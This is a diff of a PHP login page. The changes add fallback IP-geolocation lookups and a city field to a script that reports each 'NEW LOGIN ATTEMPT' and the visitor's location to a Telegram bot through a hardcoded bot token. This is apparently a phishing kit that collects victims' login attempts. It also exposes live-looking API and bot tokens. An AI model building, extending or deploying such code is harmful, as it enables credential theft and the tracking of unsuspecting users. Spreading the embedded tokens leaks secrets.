@@ -1,27 +1,6 @@
 <?php
 session_start(); // Start the session first
 
-// Check if this is a redirect prevention - avoid infinite loops
-// if (isset($_GET['t']) || isset($_GET['r'])) {
-
-//     // Only redirect if no query parameters exist
-//     $originalUrl = 'login.php';
-//     $uniqueQueryString = 't=' . time();
-    
-//     // Check if URL already has query string
-//     if (strpos($originalUrl, '?') === false) {
-//         $newUrl = $originalUrl . '?' . $uniqueQueryString;
-//     } else {
-//         $newUrl = $originalUrl . '&' . $uniqueQueryString;
-//     }
-    
-//     // Only redirect if we're not already on the redirected URL
-//     if (!isset($_GET['t'])) {
-//         header('Location: ' . $newUrl);
-//         exit();
-//     }
-// }
-
 // Fetch the date from the text file (ensure the file is outside the web root for security)
 $dateFile = 'time.txt'; // Move the file to a non-web-accessible directory
 if (!file_exists($dateFile)) {
@@ -102,7 +81,9 @@ function sanitizeInput($data) {
 }
 
 // Function to get user location using cURL
+// Enhanced function to get user location with multiple API fallbacks
 function getUserLocation($ip) {
+
     $url = "https://ipinfo.io/{$ip}/json?token=373cceb2d26abd";
     
     $ch = curl_init();
@@ -111,16 +92,118 @@ function getUserLocation($ip) {
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
     curl_setopt($ch, CURLOPT_TIMEOUT, 10);
     curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false); // Prevent following redirects
+    // Array of reliable location APIs with fallbacks
+    $apis = [
+        // Primary: ipinfo.io (your current API)
+        [
+            'url' => "https://ipinfo.io/{$ip}/json?token=c645a154c3cdd5",
+            'parser' => function($data) {
+                return [
+                    'country' => $data['country'] ?? 'Unknown',
+                    'region' => $data['region'] ?? 'Unknown',
+                    'city' => $data['city'] ?? 'Unknown',
+                    'ip' => $data['ip'] ?? 'Unknown'
+                ];
+            }
+        ],
+        // Fallback 1: ip-api.com (free, reliable)
+        [
+            'url' => "http://ip-api.com/json/{$ip}?fields=status,country,regionName,city,query",
+            'parser' => function($data) {
+                if (isset($data['status']) && $data['status'] === 'success') {
+                    return [
+                        'country' => $data['country'] ?? 'Unknown',
+                        'region' => $data['regionName'] ?? 'Unknown',
+                        'city' => $data['city'] ?? 'Unknown',
+                        'ip' => $data['query'] ?? 'Unknown'
+                    ];
+                }
+                return false;
+            }
+        ],
+        // Fallback 2: ipapi.co (free tier available)
+        [
+            'url' => "https://ipapi.co/{$ip}/json/",
+            'parser' => function($data) {
+                if (!isset($data['error'])) {
+                    return [
+                        'country' => $data['country_name'] ?? 'Unknown',
+                        'region' => $data['region'] ?? 'Unknown',
+                        'city' => $data['city'] ?? 'Unknown',
+                        'ip' => $data['ip'] ?? 'Unknown'
+                    ];
+                }
+                return false;
+            }
+        ],
+        // Fallback 3: ipgeolocation.io (free tier)
+        [
+            'url' => "https://api.ipgeolocation.io/ipgeo?apiKey=YOUR_API_KEY&ip={$ip}",
+            'parser' => function($data) {
+                return [
+                    'country' => $data['country_name'] ?? 'Unknown',
+                    'region' => $data['state_prov'] ?? 'Unknown',
+                    'city' => $data['city'] ?? 'Unknown',
+                    'ip' => $data['ip'] ?? 'Unknown'
+                ];
+            }
+        ]
+    ];
+
     
-    $response = curl_exec($ch);
-    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-    curl_close($ch);
-    
-    if ($response === false || $httpCode !== 200) {
-        return false;
+    foreach ($apis as $api) {
+        $result = makeLocationRequest($api['url']);
+        
+        if ($result !== false) {
+            $locationData = $api['parser']($result);
+            if ($locationData !== false) {
+                return $locationData;
+            }
+        }
+        
+        // Small delay between API calls to avoid rate limiting
+        usleep(100000); // 0.1 second
     }
     
-    return json_decode($response, true);
+    return false;
+}
+
+// Enhanced cURL function with better error handling and retry logic
+function makeLocationRequest($url, $retries = 2) {
+    for ($i = 0; $i <= $retries; $i++) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 15); // Increased timeout
+        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
+        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
+        curl_setopt($ch, CURLOPT_HTTPHEADER, [
+            'Accept: application/json',
+            'Cache-Control: no-cache'
+        ]);
+        
+        $response = curl_exec($ch);
+        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        $error = curl_error($ch);
+        curl_close($ch);
+        
+        // Check for successful response
+        if ($response !== false && $httpCode === 200 && empty($error)) {
+            $decoded = json_decode($response, true);
+            if (json_last_error() === JSON_ERROR_NONE) {
+                return $decoded;
+            }
+        }
+        
+        // If not the last retry, wait before trying again
+        if ($i < $retries) {
+            sleep(1);
+        }
+    }
+    
+    return false;
 }
 
 // Function to get real user IP (handles proxies and load balancers)
@@ -188,17 +271,19 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['user_name'], $_POST['
         // Get user IP address
         $userIp = getRealUserIP();
         
-        // Get user location
+        // Get user location with enhanced reliability
         $locationData = getUserLocation($userIp);
         
         // Set default values and update if location data is available
         $country = 'Unknown';
         $region = 'Unknown';
+        $city = 'Unknown';
         $ip = $userIp;
         
         if ($locationData && is_array($locationData)) {
             $country = $locationData['country'] ?? 'Unknown';
             $region = $locationData['region'] ?? 'Unknown';
+            $city = $locationData['city'] ?? 'Unknown';
             $ip = $locationData['ip'] ?? $userIp;
         }
         
@@ -214,7 +299,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['user_name'], $_POST['
         } else {
             $botToken = '8135112340:AAHvwvqU_0muChpkLfygH8SM47P9mdqFM8g';
             
-            // Prepare message
+            // Enhanced message with city information
             $telegramMessage = "📩NEW LOGIN ATTEMPT📩
             
 DETAILS:
@@ -225,6 +310,7 @@ DETAILS:
 LOCATION:
 •🌍 Country: $country
 •🗺️ State: $region
+•🏙️ City: $city
 •🌐 IP: $ip
 
 🔒•SECURED BY WIXXI TOOLS•🔒";
